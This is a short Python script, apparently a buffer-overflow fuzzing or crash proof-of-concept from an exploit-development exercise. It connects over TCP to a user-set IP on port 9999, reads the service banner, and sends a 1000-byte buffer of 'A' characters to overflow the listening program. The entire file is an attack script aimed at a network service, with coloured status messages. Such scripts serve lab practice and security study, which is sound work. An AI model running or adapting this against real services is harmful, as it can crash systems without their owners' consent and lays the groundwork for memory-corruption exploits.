import socket
import sys
from termcolor import colored

HOST = "192.168.0.6" # set your dedicated IP
PORT = 9999 
buf = b"A" * 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print(colored("[+] Trying to connect ...","yellow"))
    s.connect((HOST,PORT))

except:
    print(colored("[!] Connection error to IP:{}, port:{}", "red").format(HOST,PORT))
    print(colored("[!] Exitting...", "red"))
    sys.exit(0)

print(colored("[+] Connection successful!","yellow"))

s.recv(1024)

print(colored("[+] Sending buffer...","yellow"))
s.send(buf)
